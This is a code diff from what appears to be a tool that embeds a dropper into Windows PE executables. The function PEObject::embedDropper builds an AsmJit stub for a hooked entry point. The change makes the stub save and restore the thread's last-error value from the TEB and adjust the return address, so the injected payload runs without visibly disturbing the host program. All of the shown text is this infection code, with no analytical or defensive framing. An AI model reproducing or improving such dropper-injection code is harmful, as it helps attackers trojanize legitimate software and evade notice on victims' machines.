@@ -1115,10 +1115,24 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	restoreStub.data(&restoreVA, sizeof(DWORD));
 	restoreStub.pushfd(); // restoreVA starts here
 	restoreStub.pushad();
+
+	// save last_error
+	restoreStub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
+	restoreStub.mov(AsmJit::eax, dword_ptr(AsmJit::eax, 0x34));
+	restoreStub.push(AsmJit::eax);
+
 	restoreStub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - stubVA) );
+
+	// restore last_error
+	restoreStub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
+	restoreStub.pop(AsmJit::ebx);
+	restoreStub.mov(dword_ptr(AsmJit::eax, 0x34), AsmJit::ebx);
+	
 	restoreStub.popad();
+
+	// substract from retaddr before restoring flags
+	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 4), hookedInstruction_.len );
 	restoreStub.popfd();
-	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 0), hookedInstruction_.len );
 	restoreStub.ret();
 	
 	// install restore and call stub
